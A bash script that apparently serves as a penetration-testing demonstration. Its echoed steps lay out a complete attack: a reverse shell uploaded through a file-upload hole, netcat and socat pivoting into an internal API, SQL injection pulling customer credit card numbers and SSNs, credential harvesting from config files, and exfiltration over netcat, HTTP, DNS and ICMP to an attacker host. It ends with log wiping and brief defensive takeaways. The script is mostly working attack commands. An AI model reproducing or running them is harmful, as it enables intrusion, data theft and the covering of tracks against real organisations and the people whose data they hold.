#!/bin/bash
# Netcat Pivoting Script
# Demonstrates manual pivoting using netcat for data exfiltration

echo "=== Netcat Pivoting & Data Exfiltration ==="
echo "==========================================="
echo ""
echo "This script shows how to use netcat for pivoting when C2 is not available"
echo ""

# Step 1: Initial compromise
echo "[+] Step 1: Initial Web Server Compromise"
cat << 'EOF'
# Upload a reverse shell payload via file upload vulnerability:
cat > shell.sh << 'SHELL'
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
SHELL

# Upload it:
curl -X POST -F 'file=@shell.sh' http://<web-server-ip>:8080/upload

# Set up listener on attacker machine:
nc -lvnp 4444

# Trigger the shell (from web server):
bash /var/www/uploads/shell.sh
EOF

# Step 2: Install tools
echo ""
echo "[+] Step 2: Installing pivot tools on compromised host"
cat << 'EOF'
# On the compromised web server:
# Check if netcat is available
which nc || which netcat || which ncat

# If not, download statically compiled netcat:
curl -o /tmp/nc https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat
chmod +x /tmp/nc

# Alternative: Use bash TCP redirections
# exec 3<>/dev/tcp/<host>/<port>
EOF

# Step 3: Network enumeration
echo ""
echo "[+] Step 3: Enumerating internal network"
cat << 'EOF'
# From compromised web server:
# Find backend API server
ip addr show
ip route
cat /etc/hosts
nslookup backend-api.internal

# Scan for open ports on backend
for port in 22 80 443 8080 8081 3306 5432; do
  timeout 1 bash -c "echo >/dev/tcp/<backend-ip>/$port" && echo "Port $port open"
done
EOF

# Step 4: Create pivot tunnel
echo ""
echo "[+] Step 4: Setting up netcat relay/pivot"
cat << 'EOF'
# Method 1: Simple port forward using netcat
# On web server (pivot host):
mkfifo /tmp/backpipe
nc -l -p 8888 0</tmp/backpipe | nc <backend-api-ip> 8081 1>/tmp/backpipe

# Now from attacker machine:
curl http://<web-server-ip>:8888/api/customers

# Method 2: Using socat (if available):
socat TCP-LISTEN:8888,fork TCP:<backend-api-ip>:8081
EOF

# Step 5: Access backend API
echo ""
echo "[+] Step 5: Accessing backend API through pivot"
cat << 'EOF'
# Through the pivot, access backend API:
# Get customer data:
curl http://<pivot-ip>:8888/api/customers

# Exploit SQL injection:
curl "http://<pivot-ip>:8888/api/customers/search?q=' UNION SELECT null,null,null,table_name,null,null FROM information_schema.tables--"

# Extract database schema:
curl "http://<pivot-ip>:8888/api/customers/search?q=' UNION SELECT null,null,null,column_name,null,null FROM information_schema.columns WHERE table_name='customers'--"
EOF

# Step 6: Database credential extraction
echo ""
echo "[+] Step 6: Extracting database credentials"
cat << 'EOF'
# If we can execute commands on backend API server:
# First, get shell on backend through web server pivot

# From web server, create reverse tunnel:
nc <backend-api-ip> 22 < /tmp/f | nc -l -p 2222 > /tmp/f

# Or use SSH if credentials are known:
ssh -L 5432:<rds-endpoint>:5432 ec2-user@<backend-api-ip>

# Extract credentials from environment or config:
env | grep -i db
cat /opt/backend-api/.env
ps aux | grep -i postgres
EOF

# Step 7: Database access
echo ""
echo "[+] Step 7: Accessing the database"
cat << 'EOF'
# If PostgreSQL client is available:
PGPASSWORD=<password> psql -h <rds-endpoint> -U dbadmin -d customerdb -c "SELECT * FROM customers"

# Without psql client, use backend API SQL injection:
curl "http://<pivot-ip>:8888/api/customers/search?q=' UNION SELECT id::text, name, email, credit_card, ssn, balance::text FROM customers--"
EOF

# Step 8: Data staging
echo ""
echo "[+] Step 8: Staging data for exfiltration"
cat << 'EOF'
# Create a staging area on compromised host:
mkdir /tmp/.hidden
cd /tmp/.hidden

# Dump data through SQL injection to file:
curl "http://localhost:8081/api/customers" > customers.json

# Compress the data:
tar czf data.tar.gz *.json
base64 data.tar.gz > data.b64

# Split for DNS exfiltration if needed:
split -b 32 data.b64 chunk_
EOF

# Step 9: Exfiltration methods
echo ""
echo "[+] Step 9: Data exfiltration techniques"
cat << 'EOF'
# Method 1: Direct netcat transfer
# On attacker machine:
nc -l -p 9999 > stolen_data.tar.gz

# On compromised host:
nc <attacker-ip> 9999 < /tmp/.hidden/data.tar.gz

# Method 2: HTTP POST
curl -X POST -F "file=@data.tar.gz" http://<attacker-server>/upload

# Method 3: DNS exfiltration (slow but stealthy)
for chunk in chunk_*; do
  data=$(cat $chunk | tr -d '\n')
  nslookup $data.exfil.<attacker-domain>
done

# Method 4: ICMP tunnel
# Using ptunnel or icmptunnel if available
ptunnel -p <pivot-host> -lp 8000 -da <attacker-ip> -dp 22

# Method 5: Encode in HTTP headers
curl -H "Cookie: $(cat data.b64 | head -n1)" http://<attacker-server>/

# Method 6: Using legitimate services (if allowed outbound)
# Upload to pastebin, github gist, etc. (be careful with sensitive data!)
EOF

# Step 10: Cleanup
echo ""
echo "[+] Step 10: Covering tracks"
cat << 'EOF'
# Remove artifacts:
rm -rf /tmp/.hidden
rm /tmp/backpipe
rm /var/www/uploads/shell.sh
rm /var/www/uploads/implant.elf

# Clear logs (requires root):
echo > /var/log/web-server-access.log
echo > /var/log/backend-api-access.log
history -c
unset HISTFILE

# Kill pivot processes:
pkill -f "nc.*8888"
pkill -f "socat.*8888"
EOF

echo ""
echo "=== Pivoting Complete ==="
echo ""
echo "Key Takeaways:"
echo "- Network segmentation alone is not enough"
echo "- Monitor for unusual network connections"
echo "- Implement egress filtering"
echo "- Use application-level authentication between services"
echo "- Monitor for data staging in /tmp and other writable directories"
echo "- Implement DLP (Data Loss Prevention) solutions"
echo "- Regular security assessments and penetration testing"